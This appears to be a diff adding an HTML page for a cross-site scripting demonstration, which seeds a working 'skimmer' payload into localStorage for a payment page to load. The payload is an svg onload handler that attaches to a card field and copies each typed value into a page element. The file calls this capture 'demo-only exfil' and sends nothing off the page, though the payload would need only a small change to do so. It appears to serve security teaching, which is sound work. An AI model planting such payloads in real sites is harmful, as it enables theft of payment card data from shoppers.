@@ -1,0 +1,16 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Seed local state (simulating attacker or third-party config)</title>
+<p>Seeding a tiny “skimmer” payload into <code>localStorage.msg</code>…</p>
+<script>
+  // Silent payload using <svg onload> (no console error spam)
+  const payload = `<svg xmlns="http://www.w3.org/2000/svg" onload="(function(){
+    var f=document.getElementById('card'); if(!f){return;}
+    document.getElementById('status').textContent='Skimmer ACTIVE';
+    f.addEventListener('input',function(ev){
+      document.getElementById('log').textContent = ev.target.value; // demo-only “exfil”
+    });
+  })()"></svg>`;
+  localStorage.setItem('msg', payload);
+</script>
+<p>Done. Now open the payment page (normal URL): <a href="payment.html">payment.html</a></p>
